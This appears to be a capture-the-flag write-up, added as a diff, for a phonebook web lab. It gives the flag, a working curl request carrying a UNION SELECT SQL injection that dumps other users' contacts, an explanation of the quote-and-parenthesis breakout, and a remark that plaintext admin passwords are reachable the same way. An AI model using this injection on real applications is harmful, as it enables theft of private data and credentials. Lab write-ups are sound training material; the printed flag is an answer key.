@@ -1,0 +1,21 @@
+Flag: `ctfzone{SQLi_f0r_n0w_f0r_3v3r_F0r_LIFFEEE}`
+
+Shortest path:
+1. Register/login any user.
+2. Hit the vulnerable search endpoint with a `UNION SELECT`.
+3. Dump contacts from other users.
+
+Working payload:
+```bash
+curl -sS -b /tmp/phonebook.cookies \
+"http://labs.ctfzone.com:6794/api/contacts/search?q=%27)%20UNION%20SELECT%20id,user_id,name,phone,email,address,notes,created_at,updated_at%20FROM%20contacts%20WHERE%20user_id!=4--%20"
+```
+
+Why it works:
+`/api/contacts/search?q=...` is building SQL unsafely inside a `LIKE '%...%'` clause. The breakout is `') ... -- `, and the query returns 9 columns, matching the `contacts` table shape.
+
+The flag row I pulled was:
+- `name`: `Flag Keeper`
+- `notes`: `ctfzone{SQLi_f0r_n0w_f0r_3v3r_F0r_LIFFEEE}`
+
+There’s also a second issue: user passwords are stored in plaintext, and the admin password can be dumped via the same injection.
